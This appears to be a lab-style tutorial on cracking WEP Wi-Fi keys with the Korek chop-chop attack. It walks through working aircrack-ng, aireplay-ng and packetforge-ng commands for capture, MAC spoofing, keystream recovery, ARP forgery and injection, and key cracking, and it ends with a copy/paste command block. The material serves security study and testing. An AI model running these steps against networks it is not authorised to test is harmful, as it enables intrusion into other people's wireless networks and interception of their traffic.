# Chain #21: Korek Chop Chop Attack

Short purpose: when fragmentation isn’t working (or is unreliable), use the Korek _chop‑chop_ attack to decrypt a captured WEP packet **byte‑by‑byte** using ICV/CRC32 feedback, recover ~1500 bytes of PRGA (.xor), forge an ARP request, replay it to mass‑generate IVs, and crack the WEP key offline.

---

## Key terms (fast refresher)

- **WEP / RC4 / PRGA** — WEP encrypts by XORing plaintext with an RC4 keystream (PRGA) per IV.
- **ICV (Integrity Check Value)** — 4‑byte CRC‑32 over plaintext; AP drops frames with bad ICV. Chop‑chop exploits this accept/drop signal to infer bytes.
- **Chop‑chop (Korek)** — iteratively trims the last byte of a ciphertext and guesses it until the AP accepts the recomputed ICV; reveals plaintext and keystream.
- **.xor (PRGA file)** — the recovered keystream used by `packetforge-ng` to encrypt forged frames (e.g., ARP request).

---

## Step‑by‑step workflow (concise)

1. Enable **monitor mode** → 
2. **Capture** traffic from target AP → 
3. Run **chop‑chop** to produce PRGA `.xor` and a decrypted `.cap` → 
4. Inspect decrypted packet for IP/MACs → 
5. **Forge ARP** with `packetforge-ng` using `.xor` → 
6. **Inject** forged ARP (interactive replay) → 
7. Optionally add **ARP replay** for more IVs → 
8. **Crack** WEP with `aircrack-ng`.

---

## Commands — statement‑by‑statement explanations

### 1) Enable monitor mode

```bash
sudo airmon-ng start wlan0
```

- **`sudo`**: requires root to change wireless modes.
- **`airmon-ng`**: helper to enable monitor mode interfaces.
- **`start wlan0`**: puts physical `wlan0` into monitor mode (usually creates `wlan0mon`).
- **Expected notes**: kill `NetworkManager`/`wpa_supplicant` if prompted; confirm chipset/driver; new iface typically `wlan0mon`.

Verify:

```bash
iwconfig
```

- **Goal**: confirm `Mode:Monitor`, channel, and power settings on `wlan0mon`.

---

### 2) Capture target AP traffic

```bash
airodump-ng wlan0mon -c 1 -w WEP
```

- **`airodump-ng`**: passive capture + display of APs/clients.    
- **`wlan0mon`**: interface in monitor mode.
- **`-c 1`**: lock to channel 1 (matches target AP).
- **`-w WEP`**: write capture files with prefix `WEP` → e.g., `WEP-01.cap`.
- **What to watch**: target **BSSID**, **ESSID**, `#Data` rising, and associated **STATION** MACs.

---

### 3) Run Korek chop‑chop to recover PRGA

```bash
aireplay-ng -4 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon
```

- **`aireplay-ng`**: injection/replay tool.    
- **`-4`**: Korek chop‑chop attack mode.
- **`-b <BSSID>`**: target AP’s MAC (here `C8:D1:4D:EA:21:A6`).
- **`-h <SRC_MAC>`**: _source MAC_ to spoof; should be associated or belong to a connected station for reliability (here `7E:8D:FC:DD:D7:2C`).
- **`wlan0mon`**: monitor interface used for injection.
- **Common prompt**: if interface MAC ≠ `-h`, set it as suggested (e.g., `ifconfig wlan0mon hw ether 7E:8D:FC:DD:D7:2C`).
- **Flow you’ll see**:
    - Tool waits for a **data packet** from STA→AP.
    - When one appears, it asks _“Use this packet?”_ → answer `y`.
    - Progress lines like `Offset 87 ...` show bytes being solved. If AP drops very short frames, the tool enables **IP header re‑creation** automatically.
- **Outputs produced**:
    - `replay_dec-<time>.cap` — decrypted packet.
    - `replay_dec-<time>.xor` — recovered keystream (PRGA).

---

### 4) Inspect decrypted packet for addressing

```bash
tcpdump -s 0 -n -e -r replay_dec-0805-221220.cap
```

- **`tcpdump`**: CLI packet analyzer.
- **`-s 0`**: capture/show full packet (no snaplen truncation).
- **`-n`**: no DNS resolution → faster, shows raw IPs.
- **`-e`**: print link‑layer (802.11) headers (BSSID/SA/DA).
- **`-r <file>`**: read from the saved cap.
- **Goal**: extract **AP IP**, **station IP**, and confirm MACs from the line showing `ethertype IPv4` (e.g., `192.168.1.75 > 192.168.1.1`).

---

### 5) Forge an ARP request using the PRGA

```bash
packetforge-ng -0 -a C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C -k 192.168.1.1 -l 192.168.1.75 -y replay_dec-0805-221220.xor -w forgedarp.cap
```

- **`packetforge-ng`**: builds **encrypted** frames using a PRGA `.xor`.    
- **`-0`** (zero): create an **ARP request** (most replay‑friendly).
- **`-a <AP_BSSID>`**: AP’s MAC (destination BSSID).
- **`-h <STA_MAC>`**: source station MAC to spoof.
- **`-k <AP_IP>`**: target IP for ARP (gateway, often `192.168.1.1`).
- **`-l <STA_IP>`**: source IP (client; here `192.168.1.75`).
- **`-y <file.xor>`**: PRGA keystream recovered by chop‑chop.
- **`-w forgedarp.cap`**: output capture with the forged ARP.
- **Tip (no IPs known)**: use broadcast placeholders `-k 255.255.255.255 -l 255.255.255.255` to still generate responses.

---

### 6) Inject the forged ARP (Interactive Packet Replay)

```bash
aireplay-ng -2 -r forgedarp.cap -h 7E:8D:FC:DD:D7:2C wlan0mon
```

- **`-2`**: interactive packet replay (prompts “Use this packet?”).
- **`-r <cap>`**: read the forged packet you created.
- **`-h <SRC_MAC>`**: inject using the chosen source MAC.
- **Effect**: AP rebroadcasts / replies, generating lots of **new IVs**.
- **How to monitor**: in `airodump-ng`, the `#Data` and the **Frames** count for the station should rise quickly.

---

### 7) (Optional) Accelerate with ARP replay

```bash
aireplay-ng -3 -b C8:D1:4D:EA:21:A6 -h 7E:8D:FC:DD:D7:2C wlan0mon
```

- **`-3`**: ARP request replay mode (captures and replays ARPs).    
- **`-b`**/**`-h`**: same AP/STA as before.
- **Benefit**: even faster IV generation; watch airodump stats soar.

---

### 8) Crack the WEP key from accumulated IVs

```bash
aircrack-ng -b C8:D1:4D:EA:21:A6 WEP-01.cap
```

- **`aircrack-ng`**: offline key recovery.
- **`-b <BSSID>`**: focus on the target AP only.
- **`WEP-01.cap`**: the capture containing IVs (from airodump).
- **Behavior**: starts PTW/Korek attack; once IVs are sufficient you’ll see `KEY FOUND! [ xx:xx:xx:xx:xx ]` and a high “Decrypted correctly” rate.

---

## Quick reference (copy/paste block)

```bash
# 1) Monitor mode
sudo airmon-ng start wlan0 && iwconfig

# 2) Capture
airodump-ng wlan0mon -c 1 -w WEP

# 3) Chop‑chop to get PRGA
aireplay-ng -4 -b <AP_BSSID> -h <STA_MAC> wlan0mon
# (accept packet → tool writes replay_dec-*.xor and replay_dec-*.cap)

# 4) Inspect decrypted packet
tcpdump -s 0 -n -e -r replay_dec-*.cap

# 5) Forge ARP with PRGA
packetforge-ng -0 -a <AP_BSSID> -h <STA_MAC> -k <AP_IP> -l <STA_IP> -y replay_dec-*.xor -w forgedarp.cap

# 6) Inject forged ARP (Interactive Replay)
aireplay-ng -2 -r forgedarp.cap -h <STA_MAC> wlan0mon

# 7) Optional: ARP replay boost
aireplay-ng -3 -b <AP_BSSID> -h <STA_MAC> wlan0mon

# 8) Crack WEP when IVs are high
aircrack-ng -b <AP_BSSID> WEP-01.cap
```

---

## Summary (one‑paragraph)

Korek chop‑chop exploits WEP’s CRC‑32 ICV and per‑packet RC4 to learn plaintext and PRGA one byte at a time by observing whether the AP accepts modified frames. The recovered PRGA (.xor) lets you forge a valid‑looking ARP request, inject and replay it to flood the network with traffic that yields many IVs, and finally crack the WEP key with `aircrack-ng`.